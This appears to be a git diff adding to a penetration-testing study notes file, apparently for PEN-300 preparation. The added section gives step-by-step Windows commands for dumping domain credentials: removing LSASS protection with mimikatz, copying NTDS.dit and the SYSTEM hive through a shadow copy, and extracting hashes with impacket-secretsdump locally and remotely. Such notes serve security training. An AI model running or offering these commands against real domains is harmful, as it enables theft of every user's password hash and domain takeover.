@@ -122,3 +122,28 @@ C:\Windows\system32> sc start mimidrv
 #From a mimikatz shell
 1. !processprotect /process:lsass.exe /remove  -> Afterwards LSA is disabled, meaning that we can dump the LSASS using the method we best like
 ```
+
+**NTDS:**
+
+The NTDS.dit, is a database that is usually stored on the Domain Controllers. The NTDS.dit contains the NTLM hash for all the domain users, so it is a prime taget for an attacker. However, in order to be able to dump it you need to be Domain Admin or be local admin on the Domain Controller.
+
+1st method(using vssadmin):
+
+```
+1. Create a shadow copy of the c:\ unit -> wmic shadowcopy call create Volume='C:\'     -> to list them -> vssadmin list shadows
+2. Get a copy of the NTDS.dit -> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
+3. Get a copy of the SYSTEM -> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system    -> or -> reg save HKLM\SYSTEM c:\system
+4. Download them to our machine and use: impacket-secretsdump -system system -ntds ntds LOCAL
+```
+
+2nd method(using impacket-secretsdump, it has various execution methods: smbexec(psexec), wmiexec(DCOM) and mmcexec(DCOM), all this execution methods are explained [here](https://github.com/trike33/PEN-300-Code-Snippets/tree/main/Windows%20Lateral%20Movement)):
+
+```
+1. impacket-secretsdump -dc-ip <domain_controller_ip> domain/username:password@target_name
+```
+(note that this last method will be more time consuming that the 1st method)
+
+**DcSync:**
+
+
+**Meterpreter:**
